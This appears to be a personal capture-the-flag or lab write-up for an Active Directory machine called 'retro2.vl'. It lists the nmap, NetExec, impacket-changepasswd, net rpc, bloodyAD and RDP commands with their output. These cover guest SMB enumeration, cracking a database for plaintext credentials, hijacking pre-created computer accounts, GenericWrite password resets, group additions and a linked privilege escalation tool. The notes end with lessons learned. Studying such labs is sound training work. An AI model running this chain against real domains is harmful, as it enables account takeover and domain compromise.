























































-----


```python
kali@kali ~> nmap -sC -sV 10.10.71.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-07 06:52 EST
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 06:53 (0:00:15 remaining)
Nmap scan report for 10.10.71.98
Host is up (0.074s latency).
Not shown: 984 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)
88/tcp    open  kerberos-sec       Microsoft Windows Kerberos (server time: 2025-02-07 11:52:29Z)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
389/tcp   open  ldap               Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds       Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=BLN01.retro2.vl
| Not valid before: 2025-02-06T11:52:00
|_Not valid after:  2025-08-08T11:52:00
| rdp-ntlm-info: 
|   Target_Name: RETRO2
|   NetBIOS_Domain_Name: RETRO2
|   NetBIOS_Computer_Name: BLN01
|   DNS_Domain_Name: retro2.vl
|   DNS_Computer_Name: BLN01.retro2.vl
|   DNS_Tree_Name: retro2.vl
|   Product_Version: 6.1.7601
|_  System_Time: 2025-02-07T11:53:51+00:00
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 

```


next would 

```python
kali@kali ~> nxc smb 10.10.71.98 -u 'a' -p 'a' --shares
SMB         10.10.71.98     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.71.98     445    BLN01            [+] retro2.vl\a:a (Guest)
SMB         10.10.71.98     445    BLN01            [*] Enumerated shares
SMB         10.10.71.98     445    BLN01            Share           Permissions     Remark
SMB         10.10.71.98     445    BLN01            -----           -----------     ------
SMB         10.10.71.98     445    BLN01            ADMIN$                          Remote Admin
SMB         10.10.71.98     445    BLN01            C$                              Default share
SMB         10.10.71.98     445    BLN01            IPC$                            Remote IPC
SMB         10.10.71.98     445    BLN01            NETLOGON                        Logon server share 
SMB         10.10.71.98     445    BLN01            Public          READ            
SMB         10.10.71.98     445    BLN01            SYSVOL                          Logon server share 
```


now we enumerate that directory

```python
kali@kali ~> cat /tmp/nxc_hosted/nxc_spider_plus/10.10.71.98.json
{
    "Public": {
        "DB/staff.accdb": {
            "atime_epoch": "2024-08-17 08:07:06",
            "ctime_epoch": "2024-08-17 08:06:49",
            "mtime_epoch": "2024-08-17 10:30:34",
            "size": "856 KB"
        }
    }
}
```

download this file and then i crack it using `office2john`


```python
    strLDAP = "LDAP://OU=staff,DC=retro2,DC=vl"
    strUser = "retro2\ldapreader"
    strPassword = "ppYaVcB5R"
```

rerunning credentials

```python
kali@kali ~> nxc smb 10.10.71.98 -u 'ldapreader' -p 'ppYaVcB5R' --shares
SMB         10.10.71.98     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.71.98     445    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R 
SMB         10.10.71.98     445    BLN01            [*] Enumerated shares
SMB         10.10.71.98     445    BLN01            Share           Permissions     Remark
SMB         10.10.71.98     445    BLN01            -----           -----------     ------
SMB         10.10.71.98     445    BLN01            ADMIN$                          Remote Admin
SMB         10.10.71.98     445    BLN01            C$                              Default share
SMB         10.10.71.98     445    BLN01            IPC$                            Remote IPC
SMB         10.10.71.98     445    BLN01            NETLOGON        READ            Logon server share 
SMB         10.10.71.98     445    BLN01            Public          READ            
SMB         10.10.71.98     445    BLN01            SYSVOL          READ            Logon server share 

```

![[retro2-20250207165354936.webp|753]]



```
kali@kali ~> nxc smb retro2.vl -u 'fs01' -p 'fs01'
SMB         10.10.71.98     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.71.98     445    BLN01            [+] retro2.vl\fs01:fs01 (Guest)
```



![[retro2-20250207170212894.webp|817]]




![[retro2-20250207170338230.webp|714]]



when trying to authenticate i get this error, the guest message wasnt real now that I look at it again

```python
kali@kali ~> nxc smb retro2.vl -u 'fs01$' -p 'fs01'
SMB         10.10.71.98     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.71.98     445    BLN01            [-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
```


https://trustedsec.com/blog/diving-into-pre-created-computer-accounts


```python
rpcchangepwd.py valhall.int/pre2000comp\$:pre2000comp@10.10.10.10 -newpass Passw0rd123!
changepasswd.py <domain>/<computer_name>\$:<computer_name>@<IP_ADDRESS> -newpass Passw0rd123! -protocol rpc-samr
```

so we have the command now lets execute it

```python
kali@kali ~/arsenal (master)> impacket-changepasswd retro2.vl/fs01\$:fs01@10.10.71.98 -newpass Passw0rd123! -protocol rpc-samr
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of retro2.vl\fs01$
[*] Connecting to DCE/RPC as retro2.vl\fs01$
[*] Password was changed successfully.
kali@kali ~/arsenal (master)> nxc smb retro2.vl -u 'fs01$' -p 'Passw0rd123!'
SMB         10.10.71.98     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.71.98     445    BLN01            [+] retro2.vl\fs01$:Passw0rd123! 
```

lets take advantage of our generic write

```python
kali@kali ~/arsenal (master)> net rpc password 'ADMWS01$' Passw0rd1 -U retro2.vl/'fs01$'%Passw0rd123! -S bln01.retro2.vl 
kali@kali ~/arsenal (master)> nxc smb retro2.vl -u 'ADMWS01$' -p 'Passw0rd1'
SMB         10.10.71.98     445    BLN01            [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True)
SMB         10.10.71.98     445    BLN01            [+] retro2.vl\ADMWS01$:Passw0rd1 
```



```python
kali@kali ~/arsenal (master)> bloodyAD --host 10.10.71.98 -d retro2.vl -u ADMWS01\$ -p 'Passw0rd1' add groupMember services ldapreader
[+] ldapreader added to services

```


```python
kali@kali ~> xfreerdp /cert-ignore /v:10.10.71.98 /u:ldapreader /p:'ppYaVcB5R' /dynamic-resolution /auto-reconnect /clipboard /compression /bpp:8 /audio-mode:0 -window-drag -themes -wallpaper /tls-seclevel:0 /timeout:80000
[12:15:24:088] [9697:9702] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[12:15:24:088] [9697:9702] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_RGB8
[12:15:24:110] [9697:9702] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded pulse backend for rdpsnd
[12:15:24:110] [9697:9702] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpsnd

```


then after that what I would do is simply get root by compiling a program and then exploiting it inside of the machine, this is the program compiled and executed


https://github.com/itm4n/Perfusion



---


## Mistakes

- got too impatient didnt check all of the queries
- need to go down everything
	- see all existing users
	- see all existing domains and double check
	- see all existing computers  and whats up with them


## Things to do

- test unicodepwd on all other users that i might have genericwrite on
- what the fuck is the difference between
	- forcechangepassword
	- unicodepwd


## Learnt

- zerologon
	- no requirement
- nopac
	- requires domain user
- printnightmare
	- requires domain user



so apparently i just did have change password permissions

```python
Get-ObjectAcl -Identity ADMWS01$ -Select SecurityIdentifier,AccessMask,ActiveDirectoryRights,ObjectAceType -ResolveGUIDs -TableView -Where "SecurityIdentifier contains RETRO2\Domain Computers" 

SecurityIdentifier       AccessMask                                                                                ActiveDirectoryRights                                                                     ObjectAceType
-----------------------  ----------------------------------------------------------------------------------------  ----------------------------------------------------------------------------------------  --------------------------
RETRO2\Domain Computers  ControlAccess                                                                                                                                                                       User-Change-Password
RETRO2\Domain Computers  ControlAccess                                                                                                                                                                       Send-As
RETRO2\Domain Computers  ControlAccess                                                                                                                                                                       Receive-As
RETRO2\Domain Computers  ControlAccess                                                                                                                                                                       User-Force-Change-Password
RETRO2\Domain Computers  ControlAccess                                                                                                                                                                       Allowed-To-Authenticate
RETRO2\Domain Computers  ReadControl,WriteProperties,ReadProperties,Self,ListChildObjects,DeleteChild,CreateChild  ReadControl,WriteProperties,ReadProperties,Self,ListChildObjects,DeleteChild,CreateChild


```


![[retro2-20250207192847160.webp]]